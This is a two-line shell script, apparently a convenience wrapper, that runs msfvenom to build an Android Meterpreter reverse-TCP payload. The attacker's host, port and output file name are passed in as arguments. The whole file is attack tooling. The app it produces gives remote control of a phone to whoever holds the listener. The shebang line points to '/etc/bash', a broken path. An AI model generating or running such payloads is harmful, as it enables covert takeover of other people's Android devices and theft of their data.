#!/etc/bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=$2  R > $3
